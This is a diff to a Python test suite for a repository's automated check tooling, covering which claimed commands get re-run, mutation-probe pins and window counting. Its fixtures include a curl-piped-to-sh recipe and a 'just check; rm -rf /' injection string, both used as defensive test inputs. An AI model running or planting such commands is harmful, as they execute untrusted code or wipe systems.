@@ -11,10 +11,8 @@ never shell out, so what is under test is exactly how each one reads a tree.
 
 from __future__ import annotations
 
-import itertools
 import json
 import os
-import re
 import subprocess
 import sys
 import threading
@@ -58,6 +56,7 @@ def _row(
     ts: str = "2026-09-15T00:00:00Z",
     disposition: str | None = None,
     producer: str = "stale_carry",
+    lineage: str = "fresh",
 ) -> dict:
     location = f"doc.md:{arc}"
     core_ = fr.FindingCore(
@@ -67,7 +66,7 @@ def _row(
         "x",
         "warn",
         "mechanized-deterministic",
-        "fresh",
+        lineage,
         producer,
     )
     env = fr.Envelope(
@@ -182,27 +181,31 @@ def test_unswept_consumers_ignores_edited_and_moved_definitions(tmp_path):
     assert unswept_consumers.Check().run(_subject(tmp_path, diff=diff)) == []
 
 
-def test_unrun_cli_reruns_allowlisted_claims_and_flags_failures(tmp_path):
+def test_unrun_cli_reruns_trusted_ruff_never_the_subjects_recipes(tmp_path):
     calls: list[list[str]] = []
 
     def execute(argv: list[str], cwd: Path) -> tuple[int, str]:
         calls.append(argv)
-        return (1, "") if argv[1] == "typecheck" else (0, "ok")
+        return (1, "") if "format" in argv else (0, "ok")
 
+    # a subject whose own `lint` recipe would run something else entirely
+    (tmp_path / "justfile").write_text("lint:\n    curl https://example.invalid | sh\n")
     subject = _subject(
         tmp_path,
-        claims_text="feat: x\n\nVerified: `just lint` and `just typecheck`\n",
+        claims_text="feat: x\n\nVerified: `just lint`\n",
         pr_body="Ran: `just fmt-check`\n",
     )
     found = unrun_cli.Check(execute=execute).run(subject)
-    assert [(f.severity, f.location) for f in found] == [("warn", "just typecheck")]
-    assert calls == [["just", "lint"], ["just", "typecheck"], ["just", "fmt-check"]]
+    assert [(f.severity, f.location) for f in found] == [("warn", "just fmt-check")]
+    assert calls == [list(unrun_cli.RERUN["just lint"]), list(unrun_cli.RERUN["just fmt-check"])]
+    assert all(argv[:3] == [sys.executable, "-m", "ruff"] for argv in calls)
 
 
-# mutation-probe: tools/mechanized_checks/unrun_cli.py:68-76 drop the allowlist gate
+# mutation-probe: tools/mechanized_checks/unrun_cli.py:69-77 drop the allowlist gate
 def test_unrun_cli_never_executes_outside_the_static_check_allowlist(tmp_path):
     refused = [
         "just codex-check",
+        "just typecheck",  # pyright is not re-run from a claim
         "just check; rm -rf /",
         "just lint fmt",  # `just` runs extra tokens as further recipes
         "just fmt-check main-protection-rollback",
@@ -217,14 +220,10 @@ def test_unrun_cli_never_executes_outside_the_static_check_allowlist(tmp_path):
     assert [(f.severity, f.location) for f in found] == [("info", c) for c in refused]
 
 
-def test_rerun_allowlist_is_static_checks_only():
-    lines = (core.REPO / "justfile").read_text().splitlines()
-    static = re.compile(r"uv run (?:ruff check \.|ruff format --check \.|pyright)")
+def test_rerun_allowlist_runs_only_this_interpreters_ruff():
     for claim, argv in unrun_cli.RERUN.items():
-        assert claim == " ".join(argv)
-        start = lines.index(f"{argv[1]}:")
-        body = list(itertools.takewhile(lambda ln: ln.startswith((" ", "\t")), lines[start + 1 :]))
-        assert body and all(static.fullmatch(ln.strip()) for ln in body), (claim, body)
+        assert argv[:3] == (sys.executable, "-m", "ruff"), claim
+        assert "just" not in argv, claim
 
 
 def test_unrun_cli_reports_an_unavailable_pr_body(tmp_path):
@@ -289,7 +288,7 @@ def test_mutation_probe_reverify_pinned_is_clean_and_indeterminate_is_named(tmp_
     assert all("REFUSED: why" in f.evidence for f in found)
 
 
-# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:129-133 drop the restore abort
+# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:132-136 drop the restore abort
 def test_mutation_probe_restore_failure_stops_the_run_whatever_the_mode(tmp_path, monkeypatch):
     log = tmp_path / "gate.jsonl"
     monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
@@ -307,7 +306,7 @@ def test_mutation_probe_restore_failure_stops_the_run_whatever_the_mode(tmp_path
     assert not log.exists()  # no finding row stands in for a possibly-mutated tree
 
 
-# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:111-118 drop the unprobed arm
+# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:114-121 drop the unprobed arm
 def test_mutation_probe_reverify_never_reads_an_unprobed_annotation_as_verified(tmp_path):
     found = mpr.Check(probe=lambda *a: pytest.fail("probed without a logged range")).run(
         _probe_fixture(tmp_path, logged=False)
@@ -316,7 +315,7 @@ def test_mutation_probe_reverify_never_reads_an_unprobed_annotation_as_verified(
     assert "never probed" in found[0].evidence
 
 
-# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:119-127 drop the stale-pin arm
+# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:122-130 drop the stale-pin arm
 def test_mutation_probe_reverify_never_probes_a_range_whose_pin_went_stale(tmp_path):
     subject = _probe_fixture(tmp_path, logged=True)
     (tmp_path / "tools" / "x.py").write_text(
@@ -325,6 +324,16 @@ def test_mutation_probe_reverify_never_probes_a_range_whose_pin_went_stale(tmp_p
     found = mpr.Check(probe=lambda *a: pytest.fail("probed a stale range")).run(subject)
     assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]
     assert "no longer pins" in found[0].evidence
+
+
+def test_a_block_scoped_pin_whose_block_moved_is_stale_too(tmp_path):
+    subject = _probe_fixture(tmp_path, logged=True)
+    log = tmp_path / ".harness" / "mutation-probe-log.jsonl"
+    row = json.loads(log.read_text())
+    log.write_text(json.dumps({**row, "pin_scope": "block", "block_sha": "any"}) + "\n")
+    (tmp_path / "tools" / "x.py").write_text("Z = 0\nA = 1\nB = 2\n")  # the block moved down
+    found = mpr.Check(probe=lambda *a: pytest.fail("probed a moved block")).run(subject)
+    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]
 
 
 def test_probe_command_quotes_the_filename_derived_node(monkeypatch, tmp_path):
@@ -378,7 +387,7 @@ def test_emit_writes_findings_and_a_clean_marker_and_reruns_never_collide(tmp_pa
     log = tmp_path / "gate.jsonl"
     monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
     finding = [core.MechFinding("doc.md:1", "e", "x")]
-    ids = {"arc_id": "u-he-40", "lane_id": "lane-a", "head_sha": HEAD}
+    ids = {"arc_id": "u-he-40", "lane_id": "lane-a", "head_sha": HEAD, "lineage": "fresh"}
     written = core.emit("stale_carry", "deterministic", finding, **ids)
     written += core.emit("cited_symbol_exists", "deterministic", [], **ids)
     rows = fr.read_rows(log)
@@ -424,7 +433,7 @@ def test_only_a_blocking_checks_warn_or_hard_finding_fails_the_run(tmp_path, mon
     assert run(info, core.Blocking(PROMOTED)) == 0
 
 
-# mutation-probe: tools/mechanized_checks/core.py:290-292 drop the gate_demotion row + NOTIFY
+# mutation-probe: tools/mechanized_checks/core.py:293-295 drop the gate_demotion row + NOTIFY
 def test_promotion_demotion_state_machine(tmp_path, monkeypatch):
     monkeypatch.setattr(core, "STATE_PATH", tmp_path / "state.json")
     log = tmp_path / "gate.jsonl"
@@ -461,7 +470,7 @@ def test_promotion_demotion_state_machine(tmp_path, monkeypatch):
     assert len(fr.read_rows(log)) == 1
 
 
-# mutation-probe: tools/mechanized_checks/core.py:267 drop the since-promotion window filter
+# mutation-probe: tools/mechanized_checks/core.py:270 drop the since-promotion window filter
 def test_rejected_windows_count_arcs_observed_since_promotion():
     early = "2026-09-01T00:00:00Z"  # before promotion: its arc belongs to no window
     rows = [
@@ -469,16 +478,24 @@ def test_rejected_windows_count_arcs_observed_since_promotion():
         _row(99, "finding", n=2, ts=early),
         _row(99, "finding_adjudication", n=2, ts=early, disposition="rejected"),
     ]
-    rows += [_row(a, "no_finding") for a in range(45)]
-    rows += [_row(a, "finding", n=2) for a in (3, 5, 25, 30, 41)]
-    rows += [_row(a, "finding_adjudication", n=2, disposition="rejected") for a in (3, 5, 25, 30)]
+    # 41 live arcs; rejections on the 20th, 21st, 40th and 41st (arcs 19, 20, 39, 40)
+    rows += [_row(a, "no_finding") for a in range(41)]
+    rows += [_row(a, "finding", n=2) for a in (19, 20, 39, 40)]
+    rows += [_row(a, "finding_adjudication", n=2, disposition="rejected") for a in (19, 20, 39, 40)]
+    # replay rows re-measure history: they must not advance or fill any window
+    rows += [_row(500 + a, "no_finding", lineage="replay") for a in range(40)]
+    rows += [_row(500 + a, "finding", n=2, lineage="replay") for a in range(40)]
+    rows += [
+        _row(500 + a, "finding_adjudication", n=2, disposition="rejected", lineage="replay")
+        for a in range(40)
+    ]
     rows += [
         _row(7, "finding", n=2, producer="cited_symbol_exists"),
         _row(
             7, "finding_adjudication", n=2, disposition="rejected", producer="cited_symbol_exists"
         ),
     ]
-    # 45 arcs -> two complete 20-arc windows; arc 41's finding sits in the incomplete third
+    # windows end at the latest arc: arcs 1..20 and 21..40 each hold two rejections
     assert core.rejected_windows(rows, "stale_carry", since=PROMOTED) == [2, 2]
 
 
@@ -593,7 +610,7 @@ def test_replay_measures_each_arc_once(tmp_path, monkeypatch):
 
     assert run() == run() == core.Measured((False, False))
     assert check.seen == [("a.md",), ("a.md",)]  # two arcs, each measured by the first replay only
-    monkeypatch.setattr(runner, "implementation_digest", lambda check: "changed-checker")
+    monkeypatch.setattr(runner, "implementation_digest", lambda: "changed-checker")
     assert run() == core.Measured((False, False))
     assert len(check.seen) == 4  # a changed implementation re-measures every arc
 
